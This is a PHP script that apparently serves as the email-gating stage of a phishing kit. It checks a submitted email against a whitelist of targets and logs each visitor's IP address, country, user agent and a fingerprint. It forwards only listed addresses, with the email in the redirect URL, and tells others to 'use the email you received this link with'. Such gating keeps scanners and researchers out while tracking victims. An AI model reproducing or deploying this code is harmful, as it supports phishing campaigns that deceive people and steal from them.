<?php
header('Content-Type: application/json');

$payload = json_decode(file_get_contents('php://input'), true);
$email   = strtolower(trim($payload['email'] ?? ''));
$jsToken = trim($payload['jsToken'] ?? '');

if ($jsToken === '') {
  echo json_encode(['success'=>false,'message'=>'Session error']); exit;
}

// Load whitelist
$list  = file(__DIR__ . '/../../.data/whitelist.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$valid = in_array($email, array_map('strtolower', $list));

// Info to log
$ip   = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown-UA';
$cc   = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? '??';
$time = date('Y-m-d H:i:s');

// JSON log format
$logEntry = [
  'time'  => $time,
  'email' => $email,
  'ip'    => $ip,
  'cc'    => $cc,
  'fp'    => substr($jsToken, 0, 16),  // Optional fingerprint
  'ua'    => $ua
];

file_put_contents(__DIR__ . '/../../.data/validated.log', json_encode($logEntry) . PHP_EOL, FILE_APPEND);

if ($valid) {
  echo json_encode([
    'success' => true,
    'redirectUrl' => '/fina#$?' . urlencode($email)
  ]);

} else {
  echo json_encode(['success' => false, 'message' => 'Use the email you received this link with.']);
}
